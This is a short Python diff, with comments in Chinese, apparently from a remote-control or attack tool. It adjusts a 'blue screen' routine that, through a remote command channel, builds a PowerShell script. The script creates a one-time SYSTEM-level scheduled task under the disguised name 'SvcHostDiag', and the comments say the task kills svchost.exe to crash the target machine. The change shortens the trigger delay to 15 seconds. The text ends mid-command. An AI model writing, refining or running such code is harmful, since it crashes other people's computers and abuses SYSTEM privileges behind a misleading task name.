@@ -37,12 +37,15 @@ LOGOFF_COMMAND = "shutdown /l"
 
 # 蓝屏：用 SYSTEM 权限的计划任务结束 svchost.exe。命令通道不是管理员身份，
 # 因此靠 schtasks 以 SYSTEM 建一次性任务再立即运行；脚本按通道上限分片下发。
-# 触发时间取目标本机时间加半分钟，并按 schtasks 要求的 MM/dd/yyyy 与 HH:mm 书写。
+# 触发时间取目标本机时间加十几秒，并按 schtasks 要求的 MM/dd/yyyy 与 HH:mm 书写。
 BLUE_SCREEN_TASK_NAME = "SvcHostDiag"
 
+# 计划任务的触发时间相对目标本机时间推后多少秒。
+BLUE_SCREEN_TRIGGER_SECONDS = 15
+
 BLUE_SCREEN_SCRIPT = (
-    "$t='%s';" % BLUE_SCREEN_TASK_NAME
-    + "$s=(Get-Date).AddSeconds(30);"
+    "$t='%s';$s=(Get-Date).AddSeconds(%d);"
+    % (BLUE_SCREEN_TASK_NAME, BLUE_SCREEN_TRIGGER_SECONDS)
     + "schtasks /Create /TN $t /SC ONCE /ST $s.ToString('HH\\:mm') "
     "/SD $s.ToString('MM\\/dd\\/yyyy') /RL HIGHEST /RU "
     "'NT AUTHORITY\\SYSTEM' /TR "
